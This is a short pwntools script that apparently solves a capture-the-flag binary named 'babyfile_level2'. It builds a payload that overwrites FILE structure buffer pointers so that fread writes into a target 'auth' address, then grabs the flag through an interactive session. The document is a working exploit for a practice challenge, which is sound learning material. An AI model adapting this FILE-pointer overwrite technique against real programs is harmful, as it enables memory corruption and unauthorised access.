from pwn import *

# Set up connection
#context.log_level = 'debug'
p = process('./babyfile_level2')  # or remote connection
s = '''
b * fread
'''


auth = 0x004041f8

offset_to_buf_base = 0x8 * 7
payload = b'\x00' * offset_to_buf_base
payload += p64(0x004041f8)
payload += p64(0x004041f8 + 0x110)
payload += b'\x00' * (0x8 * 5)
payload += p64(0)


p.sendline(payload)
#gdb.attach(p, s)
p.sendline(b'1' * 0x120)

# Get output which should contain the flag
p.interactive()
